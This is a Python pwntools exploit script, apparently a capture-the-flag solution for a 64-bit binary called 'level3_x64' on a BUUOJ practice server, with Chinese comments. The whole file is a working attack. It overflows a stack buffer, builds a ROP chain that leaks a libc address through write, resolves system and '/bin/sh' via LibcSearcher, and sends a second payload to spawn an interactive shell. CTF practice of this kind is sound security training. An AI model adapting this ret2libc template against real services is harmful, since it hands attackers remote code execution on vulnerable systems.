from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)


context(os='linux', arch='i386', log_level='debug')
binary = './level3_x64'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',27076) if argv[1]=='r' else process(binary)


search_fun = 'write' #被泄露地址的函数
main_addr = 0x4005E6
print_fun = 'write' #打印被泄露地址的函数
pop_rdi_ret = 0x4006b3
pop_rsi_r15_ret = 0x4006b1
ret_addr = 0x400619


print_fun_plt = elf.plt[print_fun]
search_fun_got = elf.got[search_fun]

payload = b'a'* (0x80+8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(search_fun_got) + b'a' * 8 + p64(print_fun_plt) + p64(main_addr)  #根据选择的print_fun改变参数
#经调试发现此时ebx=0x200，不用ret2csu
io.recvuntil(b"Input:\n")
io.send(payload)
search_addr = u64(io.recv(6).ljust(8,b'\x00'))
print(hex(search_addr))
print("search_addr = ",hex(search_addr))
system_addr,binsh_addr = ret2libc(search_addr,search_fun)


payload1 = b'a' * (0x80+8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
io.recvuntil(b"Input:\n")
io.send(payload1)
io.interactive()


